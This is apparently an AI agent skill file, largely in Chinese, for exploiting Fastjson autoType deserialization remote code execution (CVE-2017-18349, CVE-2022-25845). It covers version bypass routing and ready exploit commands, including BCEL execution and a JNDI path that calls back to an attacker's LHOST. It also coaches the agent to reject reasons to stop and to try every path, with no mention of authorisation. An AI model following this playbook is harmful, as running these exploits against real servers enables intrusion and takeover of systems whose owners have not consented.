---
name: fastjson-autotype-rce
description: Exploits Fastjson autoType deserialization RCE (CVE-2017-18349, CVE-2022-25845). Use when target uses Alibaba Fastjson with autoType enabled (versions 1.2.24 through 1.2.80).
skill_type: exploit
severity: critical
tags: [java, deserialization, fastjson, cve-2017-18349, cve-2022-25845]
cve: [CVE-2017-18349, CVE-2022-25845]
---

# Fastjson autoType 反序列化 RCE

## Essential Principles

1. **Fastjson 的 autoType 允许 JSON 中 @type 指定任意类进行反序列化**
2. **首选 BCEL ClassLoader**（JDK 8 本地执行，不需回连），**次选 JNDI 注入**（需回连）
3. **版本路由**：<=1.2.24 直接 @type；1.2.25~47 L/; 前缀绕过；1.2.48~67 需新 gadget；1.2.68~80 safeMode 绕过
4. **禁止用 fastjson 2.x**（排除匹配）

## When to Use

- 指纹/扫描器报告 fastjson 1.x
- POST JSON 的接口返回 fastjson 相关错误（`autoType is not support`、`ClassNotFoundException`）
- CVE-2017-18349 / CVE-2022-25845 命中
- DNS 探测确认出站 JNDI 连接

## When NOT to Use

- Fastjson 2.x（autoType 默认关闭，架构不同）
- safeMode 已开启且版本 >= 1.2.68（基本无法绕过）
- 目标非 Java/无 Fastjson 依赖

## Rationalizations to Reject

- "JNDI 不可用就放弃" → 还有 BCEL ClassLoader 路径，不需要回连
- "BCEL 失败说明不存在" → 可能版本过新需要手工 payload，尝试所有路径
- "直接用 ReAct 探索" → 先用确定性路径（BCEL/JNDI/手动），全部失败再进 ReAct

## 路径选择

| 条件 | 路径 | 命令 |
|------|------|------|
| JDK 8 目标（无需回连） | **A: BCEL** | `python3 {skill_dir}/scripts/bcel_fastjson.py {ENDPOINT} id` |
| LHOST 可达 + JDK 8u191+ 有绕过 | **B: JNDI** | `bash {skill_dir}/scripts/jndi_fastjson.sh {ENDPOINT} {LHOST} id` |
| BCEL/JNDI 都失败 | **C: 手工 Payload** | curl 直接发 payload |
| 全部失败 | **D: LLM 兜底** | ReAct 自由推理 |

## Quick Start
```bash
# BCEL 无回连利用（优先）
python3 {skill_dir}/scripts/bcel_fastjson.py {ENDPOINT} id

# JNDI 回连利用（需 LHOST）
bash {skill_dir}/scripts/jndi_fastjson.sh {ENDPOINT} {LHOST} id
```

## 参考资料
- 版本绕过矩阵: [references/version-bypass.md](references/version-bypass.md)
